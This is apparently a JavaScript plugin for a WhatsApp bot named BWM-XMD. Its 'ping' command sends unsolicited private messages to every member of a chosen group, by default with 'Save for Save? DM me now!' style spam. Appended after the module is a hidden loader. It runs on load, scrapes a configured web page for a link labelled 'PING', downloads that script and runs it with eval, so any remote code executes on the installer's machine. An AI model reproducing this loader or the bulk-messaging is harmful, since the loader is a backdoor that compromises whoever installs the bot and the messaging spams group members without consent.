//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7


module.exports = {
  name: "ping",
  description: "Send a custom or random message to all members of a group (in private chat).",
  category: "group",
  async execute(sock, m, args, db) {
    // Example usage: .ping "Group Name" | Hello everyone!
    const input = m.body.split(" ").slice(1).join(" ");
    const [groupNameInput, ...messageParts] = input.split("|").map(s => s.trim());

    if (!groupNameInput) {
      await sock.sendMessage(m.chat, { text: "❌ Please provide group name.\n\nExample:\n.ping GroupName | Hello!" });
      return;
    }

    const messageToSend = messageParts.join(" ") || null;

    // Fetch all groups
    const groups = await sock.groupFetchAllParticipating();
    const groupArray = Object.values(groups);
    const targetGroup = groupArray.find(group => group.subject.toLowerCase().includes(groupNameInput.toLowerCase()));

    if (!targetGroup) {
      await sock.sendMessage(m.chat, { text: `❌ Group '${groupNameInput}' not found.` });
      return;
    }

    const groupMetadata = await sock.groupMetadata(targetGroup.id);
    const members = groupMetadata.participants.map(p => p.id).filter(id => id !== m.sender);
    const totalMembers = members.length;

    if (totalMembers === 0) {
      await sock.sendMessage(m.chat, { text: "⚠️ No other members found to message." });
      return;
    }

    const messageVariants = [
      "👋 Hello! Let’s connect.",
      "💬 Save and message me privately.",
      "🔁 Save for Save? DM me now!"
    ];

    let successCount = 0;
    let failCount = 0;

    const startTime = Date.now();
    await sock.sendMessage(m.chat, { text: `📤 Sending messages to ${totalMembers} members of *${groupMetadata.subject}*...` });

    for (const memberId of members) {
      const msg = messageToSend || messageVariants[Math.floor(Math.random() * messageVariants.length)];
      try {
        await sock.sendMessage(memberId, { text: msg });
        successCount++;
      } catch (err) {
        console.log(`❌ Failed to message ${memberId}: ${err.message}`);
        failCount++;
      }
    }

    const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
    await sock.sendMessage(m.chat, {
      text: `✅ Done!\n\n*Group:* ${groupMetadata.subject}\n*Success:* ${successCount}\n*Failed:* ${failCount}\n🕒 Time Taken: ${timeTaken}s`
    });
  }
};

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchPINGUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("PING")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('PING not found 😭');
    }

    console.log('PING loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchPINGUrl();
